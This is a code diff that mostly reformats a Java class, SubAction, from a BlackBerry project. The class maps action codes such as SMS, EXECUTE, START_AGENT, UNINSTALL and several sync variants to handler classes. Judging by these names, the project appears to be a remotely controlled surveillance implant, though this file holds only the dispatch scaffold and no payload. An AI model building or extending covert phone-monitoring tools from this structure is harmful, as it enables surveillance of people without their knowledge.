@@ -18,192 +18,194 @@ import blackberry.event.Event;
  * The Class SubAction.
  */
 public abstract class SubAction implements Runnable {
-	//#ifdef DEBUG
-	protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);
-	//#endif
+    //#ifdef DEBUG
+    protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);
+    //#endif
 
-	public static final int ACTION = 0x4000;
-	public static final int ACTION_SYNC = ACTION + 0x1;
-	public static final int ACTION_UNINSTALL = ACTION + 0x2;
-	public static final int ACTION_RELOAD = ACTION + 0x3;
-	public static final int ACTION_SMS = ACTION + 0x4;
-	public static final int ACTION_TOOTHING = ACTION + 0x5;
-	public static final int ACTION_START_AGENT = ACTION + 0x6;
-	public static final int ACTION_STOP_AGENT = ACTION + 0x7;
-	public static final int ACTION_SYNC_PDA = ACTION + 0x8;
-	public static final int ACTION_EXECUTE = ACTION + 0x9;
-	public static final int ACTION_SYNC_APN = ACTION + 0xa;
-	public static final int ACTION_LOG = ACTION + 0xb;
-	public static final int ACTION_SYNC_POST = ACTION + 0xc;
+    public static final int ACTION = 0x4000;
+    public static final int ACTION_SYNC = ACTION + 0x1;
+    public static final int ACTION_UNINSTALL = ACTION + 0x2;
+    public static final int ACTION_RELOAD = ACTION + 0x3;
+    public static final int ACTION_SMS = ACTION + 0x4;
+    public static final int ACTION_TOOTHING = ACTION + 0x5;
+    public static final int ACTION_START_AGENT = ACTION + 0x6;
+    public static final int ACTION_STOP_AGENT = ACTION + 0x7;
+    public static final int ACTION_SYNC_PDA = ACTION + 0x8;
+    public static final int ACTION_EXECUTE = ACTION + 0x9;
+    public static final int ACTION_SYNC_APN = ACTION + 0xa;
+    public static final int ACTION_LOG = ACTION + 0xb;
+    public static final int ACTION_SYNC_POST = ACTION + 0xc;
 
-	public int actionId;
+    public int actionId;
 
-	protected boolean wantUninstall;
+    protected boolean wantUninstall;
 
-	protected boolean wantReload;
+    protected boolean wantReload;
 
-	protected Status status;
+    protected Status status;
 
-	/**
-	 * Factory.
-	 * 
-	 * @param actionId_
-	 *            the action id_
-	 * @param confParams
-	 *            the conf params
-	 * @return the sub action
-	 */
-	public static SubAction factory(final int actionId_, final byte[] confParams) {
-		switch (actionId_) {
-		case ACTION_SYNC:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_SYNC ***");
-			//#endif
-			return new SyncAction(actionId_, confParams);
-		case ACTION_UNINSTALL:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_UNINSTALL ***");
-			//#endif
-			return new UninstallAction(actionId_, confParams);
-		case ACTION_RELOAD:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_RELOAD ***");
-			//#endif
-			return new ReloadAction(actionId_, confParams);
-		case ACTION_SMS:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_SMS ***");
-			//#endif
-			return new SmsAction(actionId_, confParams);
-		case ACTION_TOOTHING:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_TOOTHING ***");
-			//#endif
-			return new ToothingAction(actionId_, confParams);
-		case ACTION_START_AGENT:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_START_AGENT ***");
-			//#endif
-			return new StartAgentAction(actionId_, confParams);
-		case ACTION_STOP_AGENT:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_STOP_AGENT ***");
-			//#endif
-			return new StopAgentAction(actionId_, confParams);
-		case ACTION_SYNC_PDA:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_SYNC_PDA ***");
-			//#endif
-			return new SyncPdaAction(actionId_, confParams);
-		case ACTION_EXECUTE:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_EXECUTE ***");
-			//#endif
-			return new ExecuteAction(actionId_, confParams);
-		case ACTION_SYNC_APN:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_SYNC ***");
-			//#endif
-			return new SyncActionApn(actionId_, confParams);
-		case ACTION_LOG:
-			//#ifdef DEBUG_TRACE
-			debug.trace("Factory *** ACTION_INFO ***");
-			//#endif
-			return new LogAction(actionId_, confParams);
-	     case ACTION_SYNC_POST:
-	            //#ifdef DEBUG_TRACE
-	            debug.trace("Factory *** ACTION_POST ***");
-	            //#endif
-	            return new SyncActionPost(actionId_, confParams);
-		default:
-			return null;
-		}
-	}
+    /**
+     * Factory.
+     * 
+     * @param actionId_
+     *            the action id_
+     * @param confParams
+     *            the conf params
+     * @return the sub action
+     */
+    public static SubAction factory(final int actionId_, final byte[] confParams) {
+        switch (actionId_) {
+        case ACTION_SYNC:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_SYNC ***");
+            //#endif
+            return new SyncAction(actionId_, confParams);
+        case ACTION_UNINSTALL:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_UNINSTALL ***");
+            //#endif
+            return new UninstallAction(actionId_, confParams);
+        case ACTION_RELOAD:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_RELOAD ***");
+            //#endif
+            return new ReloadAction(actionId_, confParams);
+        case ACTION_SMS:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_SMS ***");
+            //#endif
+            return new SmsAction(actionId_, confParams);
+        case ACTION_TOOTHING:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_TOOTHING ***");
+            //#endif
+            return new ToothingAction(actionId_, confParams);
+        case ACTION_START_AGENT:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_START_AGENT ***");
+            //#endif
+            return new StartAgentAction(actionId_, confParams);
+        case ACTION_STOP_AGENT:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_STOP_AGENT ***");
+            //#endif
+            return new StopAgentAction(actionId_, confParams);
+        case ACTION_SYNC_PDA:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_SYNC_PDA ***");
+            //#endif
+            return new SyncPdaAction(actionId_, confParams);
+        case ACTION_EXECUTE:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_EXECUTE ***");
+            //#endif
+            return new ExecuteAction(actionId_, confParams);
+        case ACTION_SYNC_APN:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_SYNC ***");
+            //#endif
+            return new SyncActionApn(actionId_, confParams);
+        case ACTION_LOG:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_INFO ***");
+            //#endif
+            return new LogAction(actionId_, confParams);
+        case ACTION_SYNC_POST:
+            //#ifdef DEBUG
+            debug.trace("Factory *** ACTION_POST ***");
+            //#endif
+            return new SyncActionPost(actionId_, confParams);
+        default:
+            return null;
+        }
+    }
 
-	/**
-	 * Instantiates a new sub action.
-	 * 
-	 * @param actionId_
-	 *            the action id_
-	 */
-	protected SubAction(final int actionId_) {
-		status = Status.getInstance();
-		actionId = actionId_;
-	}
+    /**
+     * Instantiates a new sub action.
+     * 
+     * @param actionId_
+     *            the action id_
+     */
+    protected SubAction(final int actionId_) {
+        status = Status.getInstance();
+        actionId = actionId_;
+    }
 
-	/**
-	 * Execute.
-	 * 
-	 * @param event
-	 *            the event
-	 * @return true, if successful
-	 */
-	public abstract boolean execute(Event event);
+    /**
+     * Execute.
+     * 
+     * @param event
+     *            the event
+     * @return true, if successful
+     */
+    public abstract boolean execute(Event event);
 
-	private Event triggeringEvent;
-	private boolean finished;
+    private Event triggeringEvent;
+    private boolean finished;
 
-	/**
-	 * Prepare the execution, setting parameters and setting to false "finished".
-	 * finished variables is used to know if the execution is actually finished.
-	 * @param triggeringEvent
-	 */
-	public void prepareExecute(final Event triggeringEvent) {
-		this.triggeringEvent = triggeringEvent;
-		synchronized (this) {
-			finished = false;
-		}
-	}
+    /**
+     * Prepare the execution, setting parameters and setting to false
+     * "finished". finished variables is used to know if the execution is
+     * actually finished.
+     * 
+     * @param triggeringEvent
+     */
+    public void prepareExecute(final Event triggeringEvent) {
+        this.triggeringEvent = triggeringEvent;
+        synchronized (this) {
+            finished = false;
+        }
+    }
 
-	public synchronized boolean isFinished() {
-		return finished;
-	}
+    public synchronized boolean isFinished() {
+        return finished;
+    }
 
-	public void run() {		
-		try {
-			execute(triggeringEvent);
-		} finally {
-			synchronized (this) {
-				notify();
-				finished = true;
-			}
-		}
+    public void run() {
+        try {
+            execute(triggeringEvent);
+        } finally {
+            synchronized (this) {
+                notify();
+                finished = true;
+            }
+        }
 
-	}
+    }
 
-	/**
-	 * Parses the.
-	 * 
-	 * @param confParams
-	 *            the conf params
-	 * @return true, if successful
-	 */
-	protected abstract boolean parse(byte[] confParams);
+    /**
+     * Parses the.
+     * 
+     * @param confParams
+     *            the conf params
+     * @return true, if successful
+     */
+    protected abstract boolean parse(byte[] confParams);
 
-	/*
-	 * (non-Javadoc)
-	 * @see java.lang.Object#toString()
-	 */
-	public String toString() {
-		return "" + actionId;
-	}
+    /*
+     * (non-Javadoc)
+     * @see java.lang.Object#toString()
+     */
+    public String toString() {
+        return "" + actionId;
+    }
 
-	/**
-	 * Want reload.
-	 * 
-	 * @return true, if successful
-	 */
-	public final boolean wantReload() {
-		return wantReload;
-	}
+    /**
+     * Want reload.
+     * 
+     * @return true, if successful
+     */
+    public final boolean wantReload() {
+        return wantReload;
+    }
 
-	/**
-	 * Want uninstall.
-	 * 
-	 * @return true, if successful
-	 */
-	public final boolean wantUninstall() {
-		return wantUninstall;
-	}
+    /**
+     * Want uninstall.
+     * 
+     * @return true, if successful
+     */
+    public final boolean wantUninstall() {
+        return wantUninstall;
+    }
 
 }
